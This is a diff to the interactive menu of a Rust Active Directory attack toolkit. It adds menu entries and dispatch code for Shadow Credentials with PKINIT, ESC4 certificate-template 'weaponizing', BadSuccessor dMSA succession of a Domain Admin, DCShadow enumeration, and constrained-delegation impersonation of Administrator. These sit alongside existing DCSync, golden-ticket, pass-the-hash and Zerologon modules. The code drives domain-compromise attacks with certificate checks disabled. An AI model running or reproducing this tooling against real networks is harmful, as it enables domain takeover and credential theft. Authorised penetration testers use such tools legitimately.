@@ -6,12 +6,13 @@ use dialoguer::{theme::ColorfulTheme, Confirm, Input, Password, Select};
 
 use crate::session::{self, Session};
 use crate::{
-    abuse, adcsenum, asktgt, coerce, dcsync, dnsenum, esc1, esc_registry_scan, exec_cmd, gmsa,
-    golden, laps, lsa, netenum, poison, posture_scan, pth, rbcd, relay, roast, samr, scan,
-    secretsdump, silver, spray, winrm_exec, wmiexec_cmd, zerologon, AbuseArgs, AsktgtArgs,
-    CoerceArgs, DcsyncArgs, DnsArgs, Esc1Args, EscArgs, ExecArgs, GmsaArgs, GoldenArgs, LapsArgs,
-    LsaArgs, NetArgs, PostureArgs, PthArgs, RbcdArgs, RelayArgs, SamrArgs, SecretsdumpArgs,
-    SilverArgs, SprayArgs, WinrmArgs, ZerologonArgs,
+    abuse, adcsenum, asktgt, badsuccessor, coerce, dcshadow, dcsync, dnsenum, esc1, esc4,
+    esc_registry_scan, exec_cmd, gmsa, golden, laps, lsa, netenum, poison, posture_scan, pth,
+    rbcd, relay, roast, samr, scan, secretsdump, sessions, shadowcred, silver, spray,
+    unconstrained, winrm_exec, wmiexec_cmd, zerologon, AbuseArgs, AsktgtArgs, BadsuccessorArgs,
+    CoerceArgs, DcsyncArgs, DnsArgs, Esc1Args, Esc4Args, EscArgs, ExecArgs, GmsaArgs, GoldenArgs,
+    LapsArgs, LsaArgs, NetArgs, PostureArgs, PthArgs, RbcdArgs, RelayArgs, SamrArgs,
+    SecretsdumpArgs, SessionsArgs, ShadowcredArgs, SilverArgs, SprayArgs, WinrmArgs, ZerologonArgs,
 };
 
 /// Default Domain-Admin group RID set embedded in forged tickets.
@@ -48,6 +49,14 @@ enum Action {
     Golden,
     Silver,
     Pth,
+    // Newer entries (S2/S5/S6 additions):
+    EnumSessions,
+    Unconstrained,
+    Shadowcred,
+    Esc4,
+    Badsuccessor,
+    Dcshadow,
+    Constrained,
     ShowRoadmap,
     WipeSession,
     Exit,
@@ -113,6 +122,34 @@ const MENU: &[(&str, Action)] = &[
     (
         "Pass-the-ticket — forge → Kerberos SMB → run as SYSTEM",
         Action::Pth,
+    ),
+    (
+        "Enum sessions — SRVSVC NetrSessionEnum (session hunting)",
+        Action::EnumSessions,
+    ),
+    (
+        "Unconstrained delegation — list TRUSTED_FOR_DELEGATION hosts",
+        Action::Unconstrained,
+    ),
+    (
+        "Shadow Credentials — plant KeyCredentialLink (+ PKINIT chain)",
+        Action::Shadowcred,
+    ),
+    (
+        "ESC4 — flip a cert template's flags → ESC1-vulnerable",
+        Action::Esc4,
+    ),
+    (
+        "BadSuccessor (2025) — dMSA that succeeds a Domain Admin",
+        Action::Badsuccessor,
+    ),
+    (
+        "DCShadow — enumerate accounts holding DCSync rights",
+        Action::Dcshadow,
+    ),
+    (
+        "Constrained delegation — S4U2Self+S4U2Proxy via AllowedToDelegateTo",
+        Action::Constrained,
     ),
     (
         "Show open vectors (VECTORS.md summary)",
@@ -562,6 +599,12 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
                 target_dc: s.dc.clone(),
                 realm: s.domain.clone(),
                 target_object,
+                target: "ldap-keycred".into(),
+                trustee_sid: None,
+                ca_host: None,
+                ca_template: "User".into(),
+                ca_port: 443,
+                ca_insecure: true,
             })
             .await
         }
@@ -809,6 +852,105 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
             })
             .await
         }
+        Action::EnumSessions => {
+            let host: String = Input::new()
+                .with_prompt("Host to enumerate sessions on")
+                .with_initial_text(&s.dc)
+                .interact_text()?;
+            sessions(SessionsArgs {
+                host,
+                domain: s.netbios(),
+                user: s.username.clone(),
+                password: s.password.clone(),
+                nt_hash: s.nt_hash.clone(),
+            })
+            .await
+        }
+        Action::Unconstrained => unconstrained(s.scan_args()).await,
+        Action::Dcshadow => dcshadow(s.scan_args()).await,
+        Action::Shadowcred => {
+            let target: String = Input::new()
+                .with_prompt("Target sAMAccountName (plant KeyCredentialLink)")
+                .interact_text()?;
+            let pkinit = Confirm::new()
+                .with_prompt("Also do PKINIT to get a TGT as the target?")
+                .default(true)
+                .interact()?;
+            shadowcred(ShadowcredArgs {
+                url: s.ldap_url(),
+                user: s.username.clone(),
+                password: s.password.clone(),
+                insecure: true,
+                target,
+                pkinit,
+                kdc: if pkinit { Some(s.dc.clone()) } else { None },
+                realm: if pkinit { Some(s.realm()) } else { None },
+            })
+            .await
+        }
+        Action::Esc4 => {
+            let template: String = Input::new()
+                .with_prompt("Certificate template to weaponize (cn, e.g. User)")
+                .with_initial_text("User")
+                .interact_text()?;
+            esc4(Esc4Args {
+                url: s.ldap_url(),
+                user: s.username.clone(),
+                password: s.password.clone(),
+                insecure: true,
+                template,
+                enrollee: None,
+            })
+            .await
+        }
+        Action::Badsuccessor => {
+            let target: String = Input::new()
+                .with_prompt("Victim sAMAccountName to succeed (usually a Domain Admin)")
+                .interact_text()?;
+            let dmsa_name: String = Input::new()
+                .with_prompt("New dMSA name (no `$` suffix — appended automatically)")
+                .interact_text()?;
+            let container: String = Input::new()
+                .with_prompt("Container DN (blank = default CN=Managed Service Accounts)")
+                .allow_empty(true)
+                .interact_text()?;
+            badsuccessor(BadsuccessorArgs {
+                url: s.ldap_url(),
+                user: s.username.clone(),
+                password: s.password.clone(),
+                insecure: true,
+                container: if container.is_empty() { None } else { Some(container) },
+                dmsa_name,
+                target,
+            })
+            .await
+        }
+        Action::Constrained => {
+            // Same S4U2Self+S4U2Proxy code path as RBCD; the difference is only intent.
+            eprintln!("[*] Constrained delegation shares the RBCD chain — same prompts below.");
+            let account: String = Input::new()
+                .with_prompt("Controlled account (has msDS-AllowedToDelegateTo)")
+                .interact_text()?;
+            let account_password: String = Input::new()
+                .with_prompt(format!("Password for {account}"))
+                .interact_text()?;
+            let impersonate: String = Input::new()
+                .with_prompt("Identity to impersonate (e.g. Administrator)")
+                .with_initial_text("Administrator")
+                .interact_text()?;
+            let target_spn: String = Input::new()
+                .with_prompt("Target SPN (e.g. cifs/dc.corp.local)")
+                .interact_text()?;
+            rbcd(RbcdArgs {
+                kdc: s.dc.clone(),
+                realm: s.realm(),
+                account,
+                account_password,
+                impersonate,
+                target_spn,
+            })
+            .await
+        }
         Action::ShowRoadmap | Action::WipeSession | Action::Exit => Ok(()),
     }
 }
@@ -839,7 +981,7 @@ async fn fetch_key_and_sid(
 
     // Key via DCSync (DRSUAPI over sealed RPC).
     let mut drs =
-        dcerpc::drsuapi::DrsSession::bind(&s.dc, &s.netbios(), &s.username, &s.password).await?;
+        ms_drsr::DrsSession::bind(&s.dc, &s.netbios(), &s.username, &s.password).await?;
     let (_rid, _nt, kerb) = drs.dcsync(&s.netbios(), account).await?;
     let key = kerb
         .iter()
